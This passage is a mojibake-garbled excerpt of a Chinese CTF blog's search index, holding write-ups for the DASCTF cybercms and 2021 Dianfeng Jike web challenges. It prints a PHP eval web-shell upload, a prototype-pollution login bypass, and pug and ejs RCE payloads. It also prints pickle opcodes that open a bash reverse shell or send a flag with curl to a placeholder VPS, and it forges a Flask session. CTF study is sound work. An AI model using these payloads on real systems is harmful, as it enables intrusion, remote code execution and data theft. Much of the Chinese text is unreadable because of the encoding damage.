1546 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://a10f5ec3-1cae-476e-bb23-31ed556086dd.node4.buuoj.cn Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIZBj4kiaMbZzC9WL User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://a10f5ec3-1cae-476e-bb23-31ed556086dd.node4.buuoj.cn/admin/admin_pic.php?action=edit_pic&amp;id=33&amp;nav=pic_list&amp;admin_p_nav=content Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=775sgdevoo6c222oonmf0qhp71 Connection: close ------WebKitFormBoundaryIZBj4kiaMbZzC9WL Content-Disposition: form-data; name=\"is_thumb\" 0 ------WebKitFormBoundaryIZBj4kiaMbZzC9WL Content-Disposition: form-data; name=\"thumb_width\" 300 ------WebKitFormBoundaryIZBj4kiaMbZzC9WL Content-Disposition: form-data; name=\"thumb_height\" 200 ------WebKitFormBoundaryIZBj4kiaMbZzC9WL Content-Disposition: form-data; name=\"pic_alt\" miao ------WebKitFormBoundaryIZBj4kiaMbZzC9WL Content-Disposition: form-data; name=\"new_pic\"; filename=\"cmd.php\" Content-Type: image/png &lt;?php @eval($_POST['cmd']);?&gt; ------WebKitFormBoundaryIZBj4kiaMbZzC9WL Content-Disposition: form-data; name=\"action\" save_edit ------WebKitFormBoundaryIZBj4kiaMbZzC9WL Content-Disposition: form-data; name=\"pic_cate\" 1 ------WebKitFormBoundaryIZBj4kiaMbZzC9WL Content-Disposition: form-data; name=\"pic_path\" ./ ------WebKitFormBoundaryIZBj4kiaMbZzC9WL Content-Disposition: form-data; name=\"pic_name\" 1 ------WebKitFormBoundaryIZBj4kiaMbZzC9WL Content-Disposition: form-data; name=\"pic\" upload/img/202107070904261782.jpg ------WebKitFormBoundaryIZBj4kiaMbZzC9WL Content-Disposition: form-data; name=\"pic_ext\" jpg ------WebKitFormBoundaryIZBj4kiaMbZzC9WL Content-Disposition: form-data; name=\"id\" 33 ------WebKitFormBoundaryIZBj4kiaMbZzC9WL Content-Disposition: form-data; name=\"pic_thumb\" img/202107070904261782_thumb.jpeg ------WebKitFormBoundaryIZBj4kiaMbZzC9WL Content-Disposition: form-data; name=\"xg_category\" ç¡®å®š ------WebKitFormBoundaryIZBj4kiaMbZzC9WL-- pic_path ç•™ç©ºä¹Ÿè¡Œã€‚ å‘ï¼Œä¼ ä¸Šæ¥äº†ï¼Œèƒ½ç”¨äº†ã€‚ å–µå–µè½æ³ªï¼ˆ åˆæƒ³äº†æƒ³ï¼Œå¯»æ€ç€æ˜¯ä¸æ˜¯ iconv çš„é”…å•Šï¼Œä¸Šä¼ ç»è¿‡è¿™ä¸ªå‡½æ•°æ—¶å€™ä¸œè¥¿éƒ½æ²¡äº†â€¦â€¦ // ç¬¬ä¸€ä¸ªä¸Šä¼ ç‚¹ // includes/fun.php#588-590 $up_file_name=empty($pic_alt)?date('YmdHis').rand(1,10000):$pic_alt; $up_file_name2=iconv('UTF-8','GBK',$up_file_name); $file_name=$path.$up_file_name2.'.'.$pic_name['extension']; // ç¬¬äºŒä¸ªä¸Šä¼ ç‚¹ // admin/admin_pic.php#64-65 $pic_name=$_POST['pic_name'];//å›¾ç‰‡åç§° $pic_name = iconv('UTF-8','GBK',$pic_name); phpinfo çœ‹ä¸€çœ¼ã€‚ å¥½å®¶ä¼™ï¼Œçœ‹èµ·æ¥æ˜¯å› ä¸ºæ²¡ libiconv æˆ–è€… glibcï¼Œæ‰€ä»¥è¿™é‡Œé¢ä¸œè¥¿å°±å˜æˆç©ºäº†â€¦â€¦æ²¡äº‹äº†ã€‚ å°ç»“å…¶å®æ˜¯ä¸€æ¬¡å› ä¸ºæƒ³ä¸é€šè€Œå¼€å§‹çš„æ·±å…¥æ¢ç©¶ï¼Œå”‰ï¼Œè¿™é¢˜åšèµ·æ¥ä¸å®¹æ˜“å•Šâ€¦â€¦ æ„Ÿè§‰è¿˜æ˜¯å¤ªèœäº†ï¼Œå†æ¬¡è½æ³ªï¼ˆ ï¼ˆæºœäº†æºœäº†å–µ~","path":"2021/08/10/CTF_2021DASCTF_July_cybercms/"},{"title":"CTF | 2021 å·…å³°æå®¢ç½‘ç»œå®‰å…¨æŠ€èƒ½æŒ‘æˆ˜èµ› WriteUp","text":"å¼•è¨€ 2021 å·…å³°æå®¢ç½‘ç»œå®‰å…¨æŠ€èƒ½æŒ‘æˆ˜èµ› æ¯”èµ›æ—¶é—´ï¼š2021å¹´7æœˆ31æ—¥ 10:00 - 18:00 https://www.ichunqiu.com/2021dfjk ä¸Šå‘¨æœ«æ‘¸é±¼ï¼Œä½›ç³»æ‰“äº†ä¸‹è¿™ä¸ªå·…å³°æå®¢ç½‘ç»œå®‰å…¨æŠ€èƒ½æŒ‘æˆ˜èµ›ï¼Œå¯æ˜¯é¢˜ç›®å¥½éš¾å•Šå•Šå•Šå•Šå•Šã€‚ å–µå‘œå‘œï¼Œé¢˜ç›®ç¯å¢ƒå½“æ™š10ç‚¹å°±å…³äº†å°±ç¦»è°±ï¼Œè¿™é‡Œè¿˜æ˜¯èµ›åå¤ç°ä¸ºä¸»ï¼Œéšä¾¿å†™å†™å¥½äº†ã€‚ Miscç­¾åˆ° YYç»™æˆ‘å‘äº†ä¸€ä¸²è¡¨æƒ…ï¼Œè¯´äº†GAMEï¼Œè¿™æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ é™„ä»¶ä¸‹è½½ æå–ç ï¼ˆGAMEï¼‰å¤‡ç”¨ä¸‹è½½ ğŸ™ƒğŸ’µğŸŒ¿ğŸ¤ğŸšªğŸŒğŸğŸ¥‹ğŸš«ğŸ˜†ğŸ˜ğŸ¥‹ğŸ˜ğŸ´ğŸš°ğŸ˜â˜€ğŸŒ¿ğŸ˜‡ğŸ˜ğŸ˜¡ğŸğŸ‘‰ğŸ›©ğŸ¤£ğŸ–ğŸ’§â˜ºğŸŒ‰ğŸğŸ˜‡ğŸ˜†ğŸˆğŸ’§â©â˜ºğŸ”„ğŸŒªâŒ¨ğŸ…ğŸ…ğŸ™ƒğŸŒğŸ™ƒğŸ”ªâ˜‚ğŸ¹ğŸ•¹â˜ƒğŸŒ¿ğŸŒ‰ğŸ’µğŸğŸğŸ˜‡ğŸµğŸ˜ğŸ…ğŸˆğŸ¥‹ğŸš°âœ…ğŸˆğŸˆ emoji-aes ç›´æ¥ç”¨å’±è‡ªå·±æ­çš„äº†ï¼š https://emoji-aes.miaotony.xyz/ key: GAME flag{10ve_4nd_Peace} Webezjs é¢˜ç›®å†…å®¹ï¼šç®€å•çš„ä¸ªäººç©ºé—´ç³»ç»Ÿã€‚ ä¸€ä¸ªç®€ç®€å•å•çš„ç™»å½•ç•Œé¢ å‘ç°åªè¦ç”¨æˆ·åã€å¯†ç è¶…è¿‡5ä½æ•°å­—å°±èƒ½è¿›å…¥äº†ã€‚ è¿™ä¸ªå›¾ç‰‡æ˜¯ä»¥ base64 ç¼–ç çš„ï¼Œå¯ä»¥ä»»æ„è¯»å–æ–‡ä»¶ã€‚ é€šè¿‡æŠ¥é”™å¯ä»¥å¾—çŸ¥æºç åœ¨ /app/app.js è·¯ç”±åœ¨ /app/routes/index.js http://eci-2ze94lqyt2mqgae0klll.cloudeci1.ichunqiu.com:8888/admin?newimg=/app/app.js&amp;diy=miaotony &lt;html&gt;&lt;head&gt;&lt;title&gt;æˆ‘çš„ç©ºé—´&lt;/title&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=UTF-8\"/&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=\"\" method=\"get\"&gt; &lt;div&gt;æ›´æ”¹å›¾ç‰‡&lt;select name=\"newimg\"&gt;&lt;option value=\"./images/1.png\"&gt;çº¸é£æœº&lt;/option&gt;&lt;option value=\"./images/2.png\"&gt;äºº&lt;/option&gt;&lt;option value=\"./images/3.png\"&gt;å°ç«è½¦&lt;/option&gt;&lt;/select&gt;&lt;/div&gt;&lt;div&gt;ä¸ªæ€§ç­¾å&lt;input type=\"text\" name=\"diy\" value=\"å°Šè´µçš„adminå¯ä»¥åœ¨è¿™æ›´æ”¹ä¸ªæ€§ç­¾å\"/&gt;&lt;/div&gt;&lt;input type=\"submit\"/&gt;&lt;/form&gt;&lt;div&gt;&lt;img src='data:image/png;base64,dmFyIGNyZWF0ZUVycm9yID0gcmVxdWlyZSgnaHR0cC1lcnJvcnMnKTsKdmFyIGV4cHJlc3MgPSByZXF1aXJlKCdleHByZXNzJyk7CnZhciBwYXRoID0gcmVxdWlyZSgncGF0aCcpOwp2YXIgY29va2llUGFyc2VyID0gcmVxdWlyZSgnY29va2llLXBhcnNlcicpOwp2YXIgbG9nZ2VyID0gcmVxdWlyZSgnbW9yZ2FuJyk7CnZhciBjcnlwdG8gPSByZXF1aXJlKCdjcnlwdG8nKTsKdmFyIHNlc3Npb24gPSByZXF1aXJlKCdleHByZXNzLXNlc3Npb24nKTsKdmFyIHNlc3Npb25TdG9yZSA9IHJlcXVpcmUoJ3Nlc3Npb24tZmlsZS1zdG9yZScpKHNlc3Npb24pOwp2YXIga2V5ID0gJ3Nlc3Npb24nOwoKCnZhciBpbmRleFJvdXRlciA9IHJlcXVpcmUoJy4vcm91dGVzL2luZGV4Jyk7CnZhciBhcHAgPSBleHByZXNzKCk7CnZhciBzZWNyZXRzID0gY3J5cHRvLnJhbmRvbUJ5dGVzKDMyKS50b1N0cmluZygnaGV4Jyk7CmFwcC51c2Uoc2Vzc2lvbih7CiAgbmFtZToga2V5LAogIHNlY3JldDogc2VjcmV0cywKICBzdG9yZTogbmV3IHNlc3Npb25TdG9yZSgpLAogIHNhdmVVbmluaXRpYWxpemVkOiBmYWxzZSwKICByZXNhdmU6IGZhbHNlLAogIGNvb2tpZTogewogICAgbWF4QWdlOiAxMDAgKiA2MCAqIDYwMAogIH0KCn0pKTsKCi8vIHZpZXcgZW5naW5lIHNldHVwCmFwcC5zZXQoJ3ZpZXdzJywgcGF0aC5qb2luKF9fZGlybmFtZSwgJ3ZpZXdzJykpOwphcHAuc2V0KCd2aWV3IGVuZ2luZScsICdwdWcnKTsKCmFwcC51c2UobG9nZ2VyKCdkZXYnKSk7CmFwcC51c2UoZXhwcmVzcy51cmxlbmNvZGVkKHsgZXh0ZW5kZWQ6IGZhbHNlIH0pKTsKYXBwLnVzZShjb29raWVQYXJzZXIoKSk7CmFwcC51c2UoZXhwcmVzcy5zdGF0aWMocGF0aC5qb2luKF9fZGlybmFtZSwgJ3B1YmxpYycpKSk7CgphcHAudXNlKCcvJywgaW5kZXhSb3V0ZXIpOwoKCi8vIGNhdGNoIDQwNCBhbmQgZm9yd2FyZCB0byBlcnJvciBoYW5kbGVyCmFwcC51c2UoZnVuY3Rpb24ocmVxLCByZXMsIG5leHQpIHsKICBuZXh0KGNyZWF0ZUVycm9yKDQwNCkpOwp9KTsKCi8vIGVycm9yIGhhbmRsZXIKYXBwLnVzZShmdW5jdGlvbihlcnIsIHJlcSwgcmVzLCBuZXh0KSB7CiAgLy8gc2V0IGxvY2Fscywgb25seSBwcm92aWRpbmcgZXJyb3IgaW4gZGV2ZWxvcG1lbnQKICByZXMubG9jYWxzLm1lc3NhZ2UgPSBlcnIubWVzc2FnZTsKICByZXMubG9jYWxzLmVycm9yID0gcmVxLmFwcC5nZXQoJ2VudicpID09PSAnZGV2ZWxvcG1lbnQnID8gZXJyIDoge307CgogIC8vIHJlbmRlciB0aGUgZXJyb3IgcGFnZQogIHJlcy5zdGF0dXMoZXJyLnN0YXR1cyB8fCA1MDApOwogIHJlcy5yZW5kZXIoJ2Vycm9yJyk7Cn0pOwoKbW9kdWxlLmV4cG9ydHMgPSBhcHA7Cg=='&gt;&lt;/div&gt;&lt;p&gt;å“ˆå–½&lt;/p&gt;&lt;div&gt;miaotony&lt;/div&gt;&lt;div&gt;ä¸ªæ€§ç­¾åï¼š&lt;div&gt;miaotony&lt;/div&gt;&lt;div&gt;---miaotony&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; ä¾æ¬¡å¾—åˆ°æºç  app.js var createError = require('http-errors'); var express = require('express'); var path = require('path'); var cookieParser = require('cookie-parser'); var logger = require('morgan'); var crypto = require('crypto'); var session = require('express-session'); var sessionStore = require('session-file-store')(session); var key = 'session'; var indexRouter = require('./routes/index'); var app = express(); var secrets = crypto.randomBytes(32).toString('hex'); app.use(session({ name: key, secret: secrets, store: new sessionStore(), saveUninitialized: false, resave: false, cookie: { maxAge: 100 * 60 * 600 } })); // view engine setup app.set('views', path.join(__dirname, 'views')); app.set('view engine', 'pug'); app.use(logger('dev')); app.use(express.urlencoded({ extended: false })); app.use(cookieParser()); app.use(express.static(path.join(__dirname, 'public'))); app.use('/', indexRouter); // catch 404 and forward to error handler app.use(function(req, res, next) { next(createError(404)); }); // error handler app.use(function(err, req, res, next) { // set locals, only providing error in development res.locals.message = err.message; res.locals.error = req.app.get('env') === 'development' ? err : {}; // render the error page res.status(err.status || 500); res.render('error'); }); module.exports = app; routes/index.js var express = require('express'); var router = express.Router(); var {body, validationResult} = require('express-validator'); var crypto = require('crypto'); var fs = require('fs'); var validator = [ body('*').trim(), body('username').if(body('username').exists()).isLength({min: 5}) .withMessage(\"username is too short\"), body('password').if(body('password').exists()).isLength({min: 5}) .withMessage(\"password is too short\"),(req, res, next) =&gt; { const errors = validationResult(req) if (!errors.isEmpty()) { return res.status(400).render('msg', {title: 'error', msg: errors.array()[0].msg}); } next() } ]; router.use(validator); router.get('/', function(req, res, next) { return res.render('index', {title: \"ç™»å½•ç•Œé¢\"}); }); router.post('/login', function(req, res, next) { let username = req.body.username; let password = req.body.password; if (username !== undefined &amp;&amp; password !== undefined) { if (username == \"admin\" &amp;&amp; password === crypto.randomBytes(32).toString('hex')) { req.session.username = \"admin\"; } else if (username != \"admin\"){ req.session.username = username; } else { return res.render('msg',{title: 'error', msg: 'admin password error'}); } return res.redirect('/verify'); } return res.render('msg',{title: 'error',msg: 'plz input your username and password'}); }); router.get('/verify', function(req, res, next) { console.log(req.session.username); if (req.session.username === undefined) { return res.render('msg', {title: 'error', msg: 'login first plz'}); } if (req.session.username === \"admin\") { req.session.isadmin = \"admin\"; } else { req.session.isadmin = \"notadmin\"; } return res.render('verify', {title: 'success', msg: 'verify success'}); }); router.get('/admin', function(req, res, next) { //req.session.debug = true; if (req.session.username !== undefined &amp;&amp; req.session.isadmin !== undefined) { if (req.query.newimg !== undefined) req.session.img = req.query.newimg; var imgdata = fs.readFileSync(req.session.img? req.session.img: \"./images/1.png\"); var base64data = Buffer.from(imgdata, 'binary').toString('base64'); var info = {title: 'æˆ‘çš„ç©ºé—´', msg: req.session.username, png: \"data:image/png;base64,\" + base64data, diy: \"åå¹´ç£¨ä¸€å‰‘ğŸ˜…v0.0.0(å°šå¤„äºå¼€å‘ç‰ˆ\"}; if (req.session.isadmin !== \"notadmin\") { if (req.session.debug !== undefined &amp;&amp; req.session.debug !== false) info.pretty = req.query.p; if (req.query.diy !== undefined) req.session.diy = req.query.diy; info.diy = req.session.diy ? req.session.diy: \"å°Šè´µçš„admin\"; return res.render('admin', info); } else { return res.render('admin', info); } } else { return res.render('msg', {title: 'error', msg: 'plz login first'}); } }); module.exports = router; package.json { \"name\": \"nodejs\", \"version\": \"0.0.0\", \"private\": true, \"scripts\": { \"start\": \"node ./bin/www\" }, \"dependencies\": { \"cookie-parser\": \"~1.4.4\", \"debug\": \"~2.6.9\", \"express\": \"~4.16.1\", \"express-session\": \"^1.17.2\", \"express-validator\": \"^6.6.0\", \"http-errors\": \"~1.6.3\", \"lodash\": \"^4.17.15\", \"morgan\": \"~1.9.1\", \"pug\": \"^3.0.0\", \"pug-code-gen\": \"^3.0.0\", \"session-file-store\": \"^1.5.0\" } } package-lock.json å¤ªé•¿äº†å°±ä¸æ”¾ä¸Šæ¥äº†ã€‚ å¯ä»¥çœ‹åˆ°ç™»å½•éªŒè¯ä¸Šç”¨äº† express-validatorï¼Œæ¨¡æ¿æ¸²æŸ“ç”¨çš„æ˜¯ pugã€‚ nodejs ä¸€èˆ¬å°±æ‰¾åŸå‹é“¾æ±¡æŸ“ä¹‹ç±»çš„å§ï¼Œåˆ†æè·¯ç”±æºç ï¼Œinfo.pretty = req.query.p; è¿™é‡Œæœ‰ç‚¹å¯ç–‘ã€‚ ä¸ºäº†è¿›åˆ°è¿™é‡Œï¼Œéœ€è¦ session é‡Œçš„ debugã€isadminã€username å‡ä¸æ˜¯ undefinedï¼Œä¸” isadmin !== \"notadmin\"ï¼Œ debug !== falseã€‚è¿™å°±éœ€è¦åœ¨ç™»å½•è·¯ç”± POST login è¿›è¡Œé‰´æƒï¼Œå¦‚æœèƒ½æŠŠ isadminã€debug è®¾ç½®ä¸ºç©ºçš„è¯å°±èƒ½ç»•è¿‡è¿›æ¥äº†ã€‚æ‰€ä»¥è¿˜æ˜¯å¾— åŸå‹é“¾æ±¡æŸ“ã€‚ å†çœ‹ validator è¿™é‡Œï¼Œbody('*').trim()ï¼Œexpress-validator ç¡®å®å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´ã€‚ å‚è€ƒ XNUCA2020Qualifier oooooooldjs writeup express-validator 6.6.0 åŸå‹é“¾æ±¡æŸ“åˆ†æ å½“ä¼ å…¥çš„é”®ä¸­å­˜åœ¨. ï¼Œåˆ™ä¼šåœ¨å­—ç¬¦ä¸¤è¾¹åŠ ä¸Š[\" \"]ï¼Œå¹¶ä¸”æœ€ç»ˆè¿”å›çš„æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²å½¢å¼çš„ç»“æœã€‚ å½“æˆ‘ä»¬ä¼ å…¥ï¼š {\"\\\"].__proto__[\\\"test\":\"123 \"} è¿™é‡Œçš„é”®ä¸º\"].__proto__[\"testï¼Œç”±äºå­—ç¬¦é‡Œé¢å­˜åœ¨.ï¼Œæ‰€ä»¥åœ¨segments.reduceå‡½æ•°å¤„ç†æ—¶ä¼šå¯¹å…¶å·¦å³åŠ åŒå¼•å·å’Œä¸­æ‹¬å·ï¼Œæœ€ç»ˆå˜æˆï¼š[\"\"].__proto__[\"test\"]ã€‚ è€Œè¿™ä¸ªè¢«æ±¡æŸ“çš„åŸå‹é“¾çš„ test å€¼ä¸ºç©ºï¼Œæ˜¯å› ä¸ºå–å€¼æ—¶ï¼Œä½¿ç”¨çš„æ˜¯ lodash.get æ–¹æ³•ä» req['body'] ä¸­å–è¢«å¤„ç†åçš„é”®å€¼ï¼Œå¤„ç†åçš„é”®æ˜¯ä¸å­˜åœ¨çš„ï¼Œæ‰€ä»¥å–å‡ºæ¥çš„å€¼å°±ä¸º undefinedã€‚å†ç»è¿‡.toString()çš„å¤„ç†å˜æˆäº†''ç©ºå­—ç¬¦ä¸²ã€‚ å¦å¤–è¿™ç¯‡æ–‡ç« ä¸­è¿˜æå‡ºäº†åˆ©ç”¨ lodash.get æ–¹æ³•æ¥æ±¡æŸ“ value çš„æ–¹æ³•ï¼Œå³ {\"a\": {\"__proto__\": {\"test\": \"testvalue\"}}, \"a\\\"].__proto__[\\\"test\": 222} æœ€åä¼šæŠŠ Object.__proto__.test çš„å€¼æ±¡æŸ“ä¸º testvalueã€‚ è¿™é“é¢˜é‡Œç¯å¢ƒä¹Ÿæ­£å¥½æ˜¯ express-validator 6.6.0ï¼Œåªä¸è¿‡ä¸æ”¯æŒ JSON æ¥ä¼ å‚ï¼Œåªèƒ½ç”¨ urlencode äº†ã€‚ äºæ˜¯æ„é€  payloadï¼š \"].__proto__[\"isadmin=aaa \"].__proto__[\"debug=bbb POST /login HTTP/1.1 ... username=miaomiao&amp;password=miaomiao&amp;\"].__proto__[\"isadmin=aaa+&amp;\"].__proto__[\"debug=bbb+ è¿™æ ·å°±èƒ½æˆåŠŸç»•è¿‡ç™»å½•æˆä¸º admin äº†ã€‚ æ¥ä¸‹æ¥å¸¦ä¸Šè¿™ä¸ª cookie æ‰“ pug getshellã€‚é¢˜ç›®é‡Œç”¨åˆ°çš„ pug ç‰ˆæœ¬æ˜¯ 3.0.0 å‚è€ƒ Remote code execution via the pretty option. CVE-2021-21353 Code injection vulnerability in visitMixin and visitMixinBlock through â€œprettyâ€ option æ„é€ å¦‚ä¸‹ payload å³å¯ RCEã€‚ http://xxxxx/admin?p=');process.mainModule.constructor._load('child_process').exec('whoami');_=(' æ³¨æ„ä¸è¦è®¿é—® /verify è·¯ç”±ï¼Œä¸ç„¶åˆæŠŠ session.isadmin èµ‹å€¼äº†ã€‚ å¯æƒœå‘ç°è¿™é¢˜ shell å¼¹ä¸å›æ¥ï¼Œåªèƒ½ curl å¤–å¸¦äº†ã€‚ å¦å¤–ç”±äºè¾“å‡ºæ¢è¡Œä¼šæˆªæ–­ï¼Œè¿™é‡Œç»™ä¸ª tipï¼Œå¯ä»¥é€šè¿‡ form-data æ–‡ä»¶ä¸Šä¼  å†é…åˆ base64 ç¼–ç çš„æ–¹å¼æ¥å®Œæ•´ä¼ è¾“ä¿¡æ¯ã€‚ curl -F \"file=`ls -al /|base64`\" http://VPS # æˆ–è€…ç›´æ¥ VPS ä¸Šèµ·ä¸ª web æœåŠ¡ï¼Œä¸Šä¼ æ–‡ä»¶ # curl -F \"file=@æ–‡ä»¶ä½ç½®\" http://VPS # ls -al / total 84 drwxr-xr-x 1 root root 4096 Jul 31 10:28 . drwxr-xr-x 1 root root 4096 Jul 31 10:28 .. drwxrwxrwx 1 root root 4096 Jul 30 17:20 app drwxr-xr-x 2 root root 4096 Jul 23 13:50 bin drwxr-xr-x 2 root root 4096 Apr 24 2018 boot drwxr-xr-x 5 root root 380 Jul 31 10:28 dev drwxr-xr-x 1 root root 4096 Jul 30 17:20 etc -rw-r--r-- 1 root root 62 Jul 30 17:21 hint drwxr-xr-x 1 root root 4096 Jul 30 17:20 home drwxr-xr-x 1 root root 4096 Jul 30 17:20 lib drwxr-xr-x 2 root root 4096 Jul 23 13:50 lib64 drwxr-xr-x 2 root root 4096 Jul 23 13:49 media drwxr-xr-x 2 root root 4096 Jul 23 13:49 mnt drwxr-xr-x 2 root root 4096 Jul 23 13:49 opt dr-xr-xr-x 108 root root 0 Jul 31 10:28 proc drwx------ 1 root root 4096 Jul 31 10:28 root drwxr-xr-x 5 root root 4096 Jul 23 13:50 run drwxr-xr-x 2 root root 4096 Jul 23 13:50 sbin drwxr-xr-x 2 root root 4096 Jul 23 13:49 srv dr-xr-xr-x 12 root root 0 Jul 31 10:45 sys drwxrwxrwt 1 root root 4096 Jul 30 17:20 tmp drwxr-xr-x 1 root root 4096 Jul 23 13:49 usr drwxr-xr-x 1 root root 4096 Jul 23 13:50 var å½“å‰ç”¨æˆ·æ˜¯ ctfï¼Œè¿™ä¸ª tac é…äº† suidã€‚ tac /root/flag.txt å…¶å®æœ¬æ¥æ˜¯æƒ³èƒ½ä¸èƒ½é€šè¿‡ä¼ªé€  session æ¥æˆç®¡ç†å‘˜çš„ï¼Œåæ¥å‘ç°æ²¡æœ‰ä¸Šä¼ ç‚¹ï¼Œä¹ˆå¾—åŠæ³•äº†ã€‚ å…·ä½“å¯ä»¥å‚è€ƒ session-file-storeåº“çš„sessionä¼ªé€ ã€‚ BTW, åŸæ¥ä»–çš„æ¨¡æ¿æ–‡ä»¶åœ¨ views ç›®å½•ä¸‹å•Šï¼Œå’±ä¸€ç›´çŒœç€ templates template ç»“æœä¸€ç›´æ²¡è¯»åˆ°â€¦â€¦ /app/views/admin.pug html head title= title meta(http-equiv=\"Content-Type\", content=\"text/html;charset=UTF-8\") body mixin hello(text) p= text div #{msg} mixin printdiy() div ä¸ªæ€§ç­¾åï¼š div #{diy} div ---#{msg} form(action=\"\", method=\"get\") div æ›´æ”¹å›¾ç‰‡ select(name=\"newimg\") option(value=\"./images/1.png\") çº¸é£æœº option(value=\"./images/2.png\") äºº option(value=\"./images/3.png\") å°ç«è½¦ div ä¸ªæ€§ç­¾å input(type=\"text\" name=\"diy\" value=\"å°Šè´µçš„adminå¯ä»¥åœ¨è¿™æ›´æ”¹ä¸ªæ€§ç­¾å\") input(type=\"submit\") div &lt;img src='#{png}'&gt; +hello(\"å“ˆå–½\") +printdiy() é¡ºä¾¿æ”¾ä¸ª ejs çš„ RCEï¼š Express+lodash+ejs: ä»åŸå‹é“¾æ±¡æŸ“åˆ°RCE a; return global.process.mainModule.constructor._load('child_process').execSync('whoami'); // opcode é¢˜ç›®å†…å®¹ï¼šå¬è¯´pickleæ˜¯ä¸€é—¨æœ‰è¶£çš„æ ˆè¯­è¨€ï¼Œä½ ä¼šæ‰‹å†™opcodeå—ï¼Ÿ ä»»æ„æ–‡ä»¶è¯»æºç  imagePath=app.py&amp;password=admin&amp;username=admin from flask import Flask from flask import request from flask import render_template from flask import session import base64 import pickle import io import builtins class RestrictedUnpickler(pickle.Unpickler): blacklist = {'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit', 'map'} def find_class(self, module, name): if module == \"builtins\" and name not in self.blacklist: return getattr(builtins, name) raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" % (module, name)) def loads(data): return RestrictedUnpickler(io.BytesIO(data)).load() app = Flask(__name__) app.config['SECRET_KEY'] = \"y0u-wi11_neuer_kn0vv-!@#se%32\" @app.route('/admin', methods = [\"POST\",\"GET\"]) def admin(): if('{}'.format(session['username'])!= 'admin' and str(session['username'] , encoding = \"utf-8\")!= 'admin'): return \"not admin\" try: data = base64.b64decode(session['data']) if \"R\" in data.decode(): return \"nonono\" pickle.loads(data) except Exception as e: print(e) return \"success\" @app.route('/login', methods = [\"GET\",\"POST\"]) def login(): username = request.form.get('username') password = request.form.get('password') imagePath = request.form.get('imagePath') session['username'] = username + password session['data'] = base64.b64encode(pickle.dumps('hello' + username, protocol=0)) try: f = open(imagePath,'rb').read() except Exception as e: f = open('static/image/error.png','rb').read() imageBase64 = base64.b64encode(f) return render_template(\"login.html\", username = username, password = password, data = bytes.decode(imageBase64)) @app.route('/', methods = [\"GET\",\"POST\"]) def index(): return render_template(\"index.html\") if __name__ == '__main__': app.run(host='0.0.0.0', port='8888') å‚è€ƒ pickleååºåˆ—åŒ–çš„åˆ©ç”¨æŠ€å·§æ€»ç»“ Pythonååºåˆ—åŒ–æ¼æ´ä¸æ²™ç®±é€ƒé€¸ ğŸSecurity Issues in Python Pickle æˆ–è€… https://hackmd.io/53c7hn_1SqOF7WoUMBrkiA?view ä»é›¶å¼€å§‹pythonååºåˆ—åŒ–æ”»å‡»ï¼špickleåŸç†è§£æ &amp; ä¸ç”¨reduceçš„RCEå§¿åŠ¿ 2020 XCTFé«˜æ ¡æˆ˜â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ› webtmp 2021 NewsCTF æ–°æ˜¥èµ› beautifulgirlfriend åˆæ˜¯æ‰‹æ“ opcodeâ€¦â€¦ å®é™…ä¸Š INST iã€OBJ oã€REDUCE R éƒ½å¯ä»¥è°ƒç”¨ä¸€ä¸ª callable å¯¹è±¡ï¼ŒæŠŠ R æ¢æˆå…¶ä»–çš„å°±å¥½ã€‚ ç„¶è€Œè¿™é¢˜å…¶å®ä»–å¹¶æ²¡æœ‰è°ƒç”¨å¤–é¢çš„è¿™ä¸ª loadsï¼Œå³æ²¡æœ‰è°ƒç”¨ RestrictedUnpicklerï¼Œåªè¦ä¸å«æœ‰ R å°±è¡Œäº†â€¦â€¦ # åå¼¹ shell b\"(cos\\nsystem\\nS\\'bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\\'\\no.\" # æˆ–è€…ç›´æ¥ b\"(cos\\nsystem\\nS\\'curl http://VPS:PORT/?flag=`/app/readflag`\\'\\no.\" æ¥ä¸‹æ¥ä¼ªé€  sessionï¼Œç›´æ¥ç”¨ Flask Session Cookie Decoder/Encoder è¿™ä¸ªè„šæœ¬å¥½äº†ã€‚ è§£ç ï¼š $ python3 flask_session_cookie_manager3.py decode -c 'eyJkYXRhIjp7IiBiIjoiVm0xb2JHSkhlSFpaVjFKMFlWYzBTMk5FUVV0TVp6MDkifSwidXNlcm5hbWUiOiJhZG1pbmFkbWluIn0.YQ_4Tg.rctkQrLvhZdSHjtRdjE21qaA1O4' -s 'y0u-wi11_neuer_kn0vv-!@#se%32' {'data': b'VmhlbGxvYWRtaW4KcDAKLg==', 'username': 'adminadmin'} ç¼–ç ï¼šæŠŠä¸Šé¢çš„ opcode base64 ä¸€ä¸‹ï¼Œç„¶åæ”¾è¿› data é‡Œã€‚ $ python3 flask_session_cookie_manager3.py encode -s 'y0u-wi11_neuer_kn0vv-!@#se%32' -t '{\"data\": \"KGNvcwpzeXN0ZW0KUydiYXNoIC1pID4mIC9kZXYvdGNwL2lwL3BvcnQgMD4mMScKby4=\", \"username\": \"adminadmin\"}' eyJkYXRhIjoiS0dOdmN3cHplWE4wWlcwS1V5ZGlZWE5vSUMxcElENG1JQzlrWlhZdmRHTndMMmx3TDNCdmNuUWdNRDRtTVNjS2J5ND0iLCJ1c2VybmFtZSI6ImFkbWluYWRtaW4ifQ.YRAgRQ.KBVqxrhR0f5FCTCzy1sLo9oaAfI æ³¨æ„æ”¹ä¸€ä¸‹ ip &amp; portã€‚ç„¶åæŠŠ cookie æ”¹äº†è®¿é—® /admin å°±èƒ½è§¦å‘äº†ã€‚ å¦‚æœæŒ‰ç…§é¢˜ç›®åŸæœ¬çš„æ„æ€ï¼Œåªèƒ½ç”¨ builtins 